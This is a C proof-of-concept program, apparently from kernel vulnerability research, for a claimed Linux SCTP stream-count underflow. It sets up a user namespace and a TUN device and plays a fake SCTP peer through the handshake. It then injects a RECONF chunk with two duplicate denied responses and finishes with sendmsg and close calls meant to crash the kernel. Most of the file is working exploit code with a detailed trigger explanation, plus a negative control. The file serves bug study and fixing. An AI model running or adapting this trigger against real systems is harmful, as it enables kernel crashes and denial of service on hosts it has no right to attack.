/* Candidate C7: sctp stream->outcnt u16 underflow via a replayed RECONF response.
 *
 * net/sctp/stream.c:1043-1061, sctp_process_strreset_resp():
 *
 *      addstrm = (struct sctp_strreset_addstrm *)req;
 *      nums   = ntohs(addstrm->number_of_streams);
 *      number = stream->outcnt - nums;          / * both __u16, no floor * /
 *      if (result == SCTP_STRRESET_PERFORMED) { ... } else {
 *              ...
 *              stream->outcnt = number;
 *      }
 *
 * A response is resolved by sctp_chunk_lookup_strreset_param(), which walks the
 * params of our own retained asoc->strreset_chunk and returns the FIRST whose
 * request_seq matches - it keeps no record of which sequence numbers have
 * already been answered. The chunk is only released once strreset_outstanding
 * reaches 0. So when the local side asked for BOTH add-out and add-in,
 * strreset_outstanding == 2 and two responses carrying the SAME response_seq
 * both resolve to the add-out param: the subtraction runs twice against an
 * already-rolled-back count.
 *
 * With outcnt 10 and an add of 100: 10 -> 110 at request time, first DENIED
 * rolls back to 10, second DENIED computes 10 - 100 = 65446.
 *
 * Sinks: sctp_stream_free() and sctp_stream_clear() loop to outcnt, and
 * sctp_sendmsg_to_asoc()'s "sinfo_stream >= outcnt" gate then admits stream ids
 * up to 65445. SCTP_SO() is genradix_ptr(), which returns NULL for an index
 * whose node was never preallocated, so the observable failure is a
 * NULL-pointer dereference rather than a slab overrun.
 *
 * WHY A USERSPACE PEER IS NEEDED: a real kernel peer answers the reconf request
 * immediately over loopback, which clears strreset_outstanding and frees the
 * chunk before anything can be replayed. So this speaks SCTP itself: a TUN
 * device carries raw IP, we answer the victim's INIT with an INIT-ACK
 * advertising RECONF support, complete the cookie exchange, and then - instead
 * of a legitimate response - inject one RECONF chunk carrying two
 * RESET_RESPONSE params with the same response_seq.
 *
 * The peer address is never assigned locally, so the host stack does not
 * ABORT the victim's INIT itself; TUN also lets us inject packets INBOUND,
 * which AF_PACKET cannot do.
 */
#include "common.h"
#include <linux/if_tun.h>
#include <sys/sysmacros.h>
#include <sys/wait.h>
#include <netinet/in.h>

#ifndef IPPROTO_SCTP
#define IPPROTO_SCTP 132
#endif
#define SOL_SCTP 132
#define SCTP_INITMSG_             2
#define SCTP_ENABLE_STREAM_RESET  118
#define SCTP_ADD_STREAMS          121
#define SCTP_ENABLE_CHANGE_ASSOC_REQ 0x04

#define CID_INIT        1
#define CID_INIT_ACK    2
#define CID_COOKIE_ECHO 10
#define CID_COOKIE_ACK  11
#define CID_RECONF      0x82

#define P_STATE_COOKIE     0x0007
#define P_SUPPORTED_EXT    0x8008
#define P_RESET_RESPONSE   0x0010
#define P_RESET_ADD_OUT    0x0011

#define STRRESET_DENIED    0x02

#define VICTIM_IP  0xc0a80901u   /* 192.168.9.1 */
#define PEER_IP    0xc0a80902u   /* 192.168.9.2 - deliberately NOT local */
#define PEER_PORT  9999
#define VICTIM_PORT 8888
#define PEER_VTAG  0x11223344u

/* ---- CRC32c (Castagnoli), as used for the SCTP checksum ------------------ */
static unsigned int crc32c_tab[256];

static void crc32c_init(void)
{
	unsigned int i, j, c;

	for (i = 0; i < 256; i++) {
		c = i;
		for (j = 0; j < 8; j++)
			c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
		crc32c_tab[i] = c;
	}
}

static unsigned int crc32c(const unsigned char *p, int len)
{
	unsigned int crc = 0xFFFFFFFFu;
	int i;

	for (i = 0; i < len; i++)
		crc = crc32c_tab[(crc ^ p[i]) & 0xFF] ^ (crc >> 8);
	return crc ^ 0xFFFFFFFFu;
}

static unsigned short ip_csum(const unsigned char *p, int len)
{
	unsigned int sum = 0;
	int i;

	for (i = 0; i + 1 < len; i += 2)
		sum += (p[i] << 8) | p[i + 1];
	if (i < len)
		sum += p[i] << 8;
	while (sum >> 16)
		sum = (sum & 0xFFFF) + (sum >> 16);
	return ~sum & 0xFFFF;
}

/* ---- byte helpers -------------------------------------------------------- */
static void put16(unsigned char *p, unsigned v) { p[0] = v >> 8; p[1] = v; }
static void put32(unsigned char *p, unsigned v)
{
	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
}
static unsigned get16(const unsigned char *p) { return (p[0] << 8) | p[1]; }
static unsigned get32(const unsigned char *p)
{
	return ((unsigned)p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
}

static int tunfd = -1;

/* The verification tag the victim expects in every packet we send it: its own
 * initiate tag, learned from the INIT. Note this is NOT the tag carried by the
 * victim's later packets -- those carry OUR tag (PEER_VTAG), and echoing that
 * back gets the packet dropped and the handshake times out. */
static unsigned victim_vtag;

/* Build IP + SCTP around `chunks` and inject it as inbound on the tun. */
static void send_sctp(unsigned sport, unsigned dport, unsigned vtag,
		      const unsigned char *chunks, int clen)
{
	unsigned char pkt[2048];
	int iplen = 20, sctplen = 12 + clen, tot = iplen + sctplen;
	unsigned int crc;

	memset(pkt, 0, sizeof(pkt));
	pkt[0] = 0x45;                       /* v4, ihl 5 */
	put16(pkt + 2, tot);
	put16(pkt + 4, 0x1234);              /* id */
	pkt[8] = 64;                         /* ttl */
	pkt[9] = IPPROTO_SCTP;
	put32(pkt + 12, PEER_IP);
	put32(pkt + 16, VICTIM_IP);
	put16(pkt + 10, ip_csum(pkt, iplen));

	put16(pkt + iplen + 0, sport);
	put16(pkt + iplen + 2, dport);
	put32(pkt + iplen + 4, vtag);
	/* checksum field left zero while computing */
	memcpy(pkt + iplen + 12, chunks, clen);

	crc = crc32c(pkt + iplen, sctplen);
	/* SCTP stores the CRC little-endian */
	pkt[iplen + 8]  = crc & 0xff;
	pkt[iplen + 9]  = (crc >> 8) & 0xff;
	pkt[iplen + 10] = (crc >> 16) & 0xff;
	pkt[iplen + 11] = (crc >> 24) & 0xff;

	if (write(tunfd, pkt, tot) != tot)
		logf("WARN: tun write failed: %s", strerror(errno));
}

/* ---- the peer ------------------------------------------------------------ */
static void send_init_ack(unsigned sport, unsigned dport, unsigned victim_vtag)
{
	unsigned char c[128];
	int n = 0, body;

	c[n++] = CID_INIT_ACK; c[n++] = 0;
	n += 2;                                  /* length, patched below */
	body = n;
	put32(c + n, PEER_VTAG);        n += 4;  /* our verification tag */
	put32(c + n, 0x10000);          n += 4;  /* a_rwnd */
	put16(c + n, 10);               n += 2;  /* num outbound streams */
	put16(c + n, 0xffff);           n += 2;  /* num inbound: don't clamp victim */
	put32(c + n, 1);                n += 4;  /* initial TSN */
	(void)body;

	/* STATE_COOKIE: opaque to the victim, it just echoes it back. */
	put16(c + n, P_STATE_COOKIE);   n += 2;
	put16(c + n, 4 + 8);            n += 2;
	memset(c + n, 0x5a, 8);         n += 8;

	/* SUPPORTED_EXT advertising RECONF, which is what sets
	 * asoc->peer.reconf_capable and lets SCTP_ADD_STREAMS proceed. */
	put16(c + n, P_SUPPORTED_EXT);  n += 2;
	put16(c + n, 4 + 1);            n += 2;
	c[n++] = CID_RECONF;
	n += 3;                                  /* pad to 4 */

	put16(c + 2, n);
	send_sctp(sport, dport, victim_vtag, c, n);
	logf("peer: sent INIT-ACK (RECONF advertised)");
}

static void send_cookie_ack(unsigned sport, unsigned dport, unsigned victim_vtag)
{
	unsigned char c[4] = { CID_COOKIE_ACK, 0, 0, 4 };

	send_sctp(sport, dport, victim_vtag, c, sizeof(c));
	logf("peer: sent COOKIE-ACK -> association established");
}

/* The payload: ONE RECONF chunk carrying TWO RESET_RESPONSE params that share a
 * response_seq, so both resolve to the same add-out request. */
static void send_double_response(unsigned sport, unsigned dport,
				 unsigned victim_vtag, unsigned req_seq)
{
	unsigned char c[64];
	int n = 0, i;

	c[n++] = CID_RECONF; c[n++] = 0;
	n += 2;                                  /* length, patched below */

	/* SKIP_REPLAY builds the negative control: one response instead of two,
	 * i.e. exactly what a well-behaved peer sends. Everything else about the
	 * run is identical, so a clean control attributes the crash to the
	 * replay rather than to the add-streams request or the abort path. */
#ifdef SKIP_REPLAY
	for (i = 0; i < 1; i++) {
#else
	for (i = 0; i < 2; i++) {
#endif
		put16(c + n, P_RESET_RESPONSE); n += 2;
		put16(c + n, 12);               n += 2;
		put32(c + n, req_seq);          n += 4;
		put32(c + n, STRRESET_DENIED);  n += 4;
	}

	put16(c + 2, n);
	send_sctp(sport, dport, victim_vtag, c, n);
	#ifdef SKIP_REPLAY
	logf("peer: CONTROL - injected ONE response for seq %u", req_seq);
#else
	logf("peer: injected RECONF with TWO responses for seq %u  <-- TRIGGER", req_seq);
#endif
}

static void peer_loop(void)
{
	unsigned char buf[4096];
	int n;

	for (;;) {
		n = read(tunfd, buf, sizeof(buf));
		if (n < 0) {
			if (errno == EINTR || errno == EAGAIN)
				continue;
			_exit(0);
		}
		if (n < 20 + 12 || (buf[0] >> 4) != 4 || buf[9] != IPPROTO_SCTP)
			continue;
		{
			int ihl = (buf[0] & 0x0f) * 4;
			unsigned char *s = buf + ihl;
			unsigned sport = get16(s), dport = get16(s + 2);
			unsigned vtag = get32(s + 4);
			unsigned char *ch = s + 12;
			unsigned char *end = buf + n;

			while (ch + 4 <= end) {
				unsigned ctype = ch[0];
				unsigned clen = get16(ch + 2);

				if (clen < 4 || ch + clen > end)
					break;

				if (ctype == CID_INIT) {
					/* initiate tag is the first word of the body:
					 * that is the tag the victim expects back. */
					victim_vtag = get32(ch + 4);

					logf("peer: got INIT (victim vtag %08x, pkt vtag %08x)", victim_vtag, vtag);
					send_init_ack(dport, sport, victim_vtag);
				} else if (ctype == CID_COOKIE_ECHO) {
					send_cookie_ack(dport, sport, victim_vtag);
				} else if (ctype == CID_RECONF) {
					/* find the add-out param and reuse its
					 * request_seq for BOTH responses */
					unsigned char *p = ch + 4;
					unsigned char *cend = ch + clen;

					while (p + 4 <= cend) {
						unsigned ptype = get16(p);
						unsigned plen = get16(p + 2);

						if (plen < 4 || p + plen > cend)
							break;
						if (ptype == P_RESET_ADD_OUT) {
							unsigned seq = get32(p + 4);
							unsigned nums = get16(p + 8);

							logf("peer: victim asked add-out seq=%u nums=%u",
							     seq, nums);
							send_double_response(dport, sport,
									     victim_vtag, seq);
							break;
						}
						p += (plen + 3) & ~3u;
					}
				}
				ch += (clen + 3) & ~3u;
			}
		}
	}
}

/* ---- setup --------------------------------------------------------------- */
static int tun_create(const char *name)
{
	struct ifreq ifr;
	int fd = open("/dev/net/tun", O_RDWR);

	if (fd < 0) {
		/* devtmpfs may not have created it */
		mkdir("/dev/net", 0755);
		if (mknod("/dev/net/tun", S_IFCHR | 0600, makedev(10, 200)) != 0 &&
		    errno != EEXIST)
			die("mknod /dev/net/tun");
		fd = open("/dev/net/tun", O_RDWR);
		if (fd < 0)
			die("open /dev/net/tun");
	}
	memset(&ifr, 0, sizeof(ifr));
	ifr.ifr_flags = IFF_TUN | IFF_NO_PI;
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, TUNSETIFF, &ifr) < 0)
		die("TUNSETIFF");
	return fd;
}

int main(void)
{
	int nl, ifi, s, pid, rc;
	struct sockaddr_in la, ra;

	logf("=== SCTP RECONF replayed-response outcnt underflow (C7) ===");
	crc32c_init();
	enter_userns();

	tunfd = tun_create("tun0");
	logf("tun0 created");

	nl = nl_open();
	ifi = if_index("tun0");
	if (ifi < 0)
		die("if_index(tun0)");
	if (addr_add4(nl, ifi, "192.168.9.1", 24) != 0)
		logf("WARN: addr_add4 failed");
	if (link_up(nl, ifi) != 0)
		logf("WARN: link_up(tun0) failed");
	/* lo up too: SCTP's address list handling wants a sane netns */
	{ int lo = if_index("lo"); if (lo > 0) link_up(nl, lo); }

	write_file("/proc/sys/net/sctp/reconf_enable", "1");
	logf("net setup done (tun0 ifindex=%d)", ifi);

	pid = fork();
	if (pid == 0) { peer_loop(); _exit(0); }
	if (pid < 0)
		die("fork");

	/* ---- victim ---- */
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if (s < 0)
		die("socket(SCTP)");

	{
		/* 10 outbound streams; the add of 100 below is what the second
		 * response then subtracts twice. */
		struct { unsigned short os, mis, attempts, to; } im = { 10, 10, 2, 3000 };
		setsockopt(s, SOL_SCTP, SCTP_INITMSG_, &im, sizeof(im));
	}
	{
		struct { unsigned int assoc_id; unsigned int value; } av =
			{ 0, SCTP_ENABLE_CHANGE_ASSOC_REQ };
		if (setsockopt(s, SOL_SCTP, SCTP_ENABLE_STREAM_RESET, &av, sizeof(av)) < 0)
			logf("WARN: SCTP_ENABLE_STREAM_RESET: %s", strerror(errno));
	}

	memset(&la, 0, sizeof(la));
	la.sin_family = AF_INET;
	la.sin_port = htons(VICTIM_PORT);
	la.sin_addr.s_addr = htonl(VICTIM_IP);
	if (bind(s, (struct sockaddr *)&la, sizeof(la)) < 0)
		die("bind");

	memset(&ra, 0, sizeof(ra));
	ra.sin_family = AF_INET;
	ra.sin_port = htons(PEER_PORT);
	ra.sin_addr.s_addr = htonl(PEER_IP);

	logf("victim: connecting to 192.168.9.2:%d", PEER_PORT);
	alarm(15);
	rc = connect(s, (struct sockaddr *)&ra, sizeof(ra));
	alarm(0);
	if (rc < 0) {
		logf("victim: connect failed: %s", strerror(errno));
		goto out;
	}
	logf("victim: ESTABLISHED");

	{
		struct { unsigned int assoc_id; unsigned short in, out; } as =
			{ 0, 1, 100 };
		rc = setsockopt(s, SOL_SCTP, SCTP_ADD_STREAMS, &as, sizeof(as));
		logf("victim: SCTP_ADD_STREAMS(+1 in, +100 out) -> %d (%s)",
		     rc, rc < 0 ? strerror(errno) : "ok");
	}

	sleep(3);   /* let the injected double response be processed */

	/* Sink 1: the outcnt gate now admits stream ids far past what the
	 * genradix has nodes for, so SCTP_SO() returns NULL. */
	logf("victim: sendmsg on stream 60000 (valid only if outcnt underflowed)");
	{
		struct sctp_sndrcvinfo_ { unsigned short sinfo_stream, sinfo_ssn, sinfo_flags;
					  unsigned int sinfo_ppid, sinfo_context, sinfo_timetolive,
						       sinfo_tsn, sinfo_cumtsn, sinfo_assoc_id; } sri;
		char cbuf[CMSG_SPACE(sizeof(sri))];
		struct msghdr msg;
		struct iovec iov;
		struct cmsghdr *cm;
		char data[8] = "trigger";

		memset(&sri, 0, sizeof(sri));
		sri.sinfo_stream = 60000;

		memset(&msg, 0, sizeof(msg));
		iov.iov_base = data; iov.iov_len = sizeof(data);
		msg.msg_iov = &iov; msg.msg_iovlen = 1;
		msg.msg_control = cbuf; msg.msg_controllen = sizeof(cbuf);
		cm = CMSG_FIRSTHDR(&msg);
		cm->cmsg_level = IPPROTO_SCTP;
		cm->cmsg_type = 0 /* SCTP_SNDRCV */;
		cm->cmsg_len = CMSG_LEN(sizeof(sri));
		memcpy(CMSG_DATA(cm), &sri, sizeof(sri));
		alarm(10);
		rc = sendmsg(s, &msg, 0);
		alarm(0);
		logf("victim: sendmsg -> %d (%s)", rc, rc < 0 ? strerror(errno) : "sent");
	}

	/* Sink 2: sctp_stream_free() loops to outcnt. Abort rather than a clean
	 * shutdown, since our peer will not answer a SHUTDOWN. */
	{
		struct linger lg = { 1, 0 };
		setsockopt(s, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
	}
	logf("victim: closing (sctp_stream_free walks outcnt)");
	close(s);
	s = -1;
	sleep(2);

out:
	if (s >= 0)
		close(s);
	logf("sequence complete");
	if (pid > 0) { kill(pid, SIGKILL); waitpid(pid, NULL, 0); }
	return 0;
}
